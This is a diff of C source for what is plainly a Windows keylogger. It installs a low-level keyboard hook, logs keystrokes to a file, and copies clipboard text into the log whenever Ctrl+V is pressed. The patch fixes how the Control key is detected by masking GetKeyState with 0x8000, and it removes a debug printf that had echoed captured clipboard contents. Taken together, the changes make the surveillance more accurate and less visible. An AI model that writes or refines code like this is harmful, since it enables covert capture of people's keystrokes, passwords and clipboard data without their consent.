@@ -5,6 +5,8 @@
 #pragma comment( lib, "user32.lib") 
 #pragma comment( lib, "gdi32.lib")
 
+#define SHIFTED 0x8000 
+
 HHOOK _hook;
 BOOL shiftIsHeld = FALSE;
 BOOL capsLockActivated = FALSE;
@@ -72,7 +74,7 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
         GetKeyState(VK_MENU);
         GetKeyboardState(keyboardState);
         // if control is up do not use tounicode to bypass control characters
-        if (GetKeyState(VK_CONTROL) || GetKeyState(VK_LCONTROL) || GetKeyState(VK_RCONTROL))
+        if (GetKeyState(VK_CONTROL) & SHIFTED)
         {
             charString[0] = useUpperCase ? kbdStruct.vkCode : tolower(kbdStruct.vkCode);
             charString[1] = '\0';
@@ -89,7 +91,7 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
         NULL);
 
     // If a control key + v is pressed, print clipboard to logs
-    if ((GetKeyState(VK_CONTROL) || GetKeyState(VK_LCONTROL) || GetKeyState(VK_RCONTROL)) && kbdStruct.vkCode == 86)
+    if ((GetKeyState(VK_CONTROL) & SHIFTED) && kbdStruct.vkCode == 86)
     {
         HGLOBAL   clipboardData; 
         LPTSTR    clipboardString;
@@ -98,13 +100,12 @@ int writeLogs (KBDLLHOOKSTRUCT kbdStruct, LPARAM lParam)
         if (!OpenClipboard(foreground)) 
             return; 
 
-        clipboardData = GetClipboardData(CF_TEXT); 
+        clipboardData = GetClipboardData(CF_TEXT);
         if (clipboardData != NULL) 
         { 
             clipboardString = GlobalLock(clipboardData); 
             if (clipboardString != NULL) 
             { 
-                printf("ADDING %s", clipboardString);
                 WriteFile( 
                     hFile,
                     clipboardString,
